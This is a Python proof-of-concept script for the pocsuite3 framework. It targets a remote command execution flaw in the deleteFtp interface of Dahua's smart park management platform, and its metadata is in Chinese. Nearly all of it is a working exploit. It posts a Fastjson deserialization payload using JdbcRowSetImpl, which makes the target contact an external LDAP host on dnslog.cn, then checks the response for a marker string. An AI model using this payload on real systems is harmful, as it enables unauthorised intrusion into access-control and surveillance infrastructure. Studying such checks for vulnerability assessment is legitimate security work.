# _*_ coding:utf-8 _*_
# @Time : 2023/11/28 11:05
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class dahuaDeleteFtpRce(POCBase):
    pocDesc = '''大华智慧园区综合管理平台deleteFtp接口远程命令执行'''
    vulID = '20231128'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-28'
    createDate = '2023-11-28'
    updateDate = '2023-11-28'
    name = '大华智慧园区综合管理平台deleteFtp接口远程命令执行'
    appName = '大华智慧园区综合管理平台'



    def _verify(self):

        result = {}
        path = "/CardSolution/card/accessControl/swingCardRecord/deleteFtp"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
            'Content-Type': 'application/json',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        url = self.url + path
        payload = {
    "ftpUrl": {
        "e": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        },
        "f": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://dahua.0hsol2.dnslog.cn",
            "autoCommit": True
        }
    }
}
        try:
            response = requests.post(url, headers=headers,json=payload,verify=False)
        # 验证成功输出相关信息
            print(response.text)
            if response.status_code == 200 and 'set property error, autoCommit' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(dahuaDeleteFtpRce)
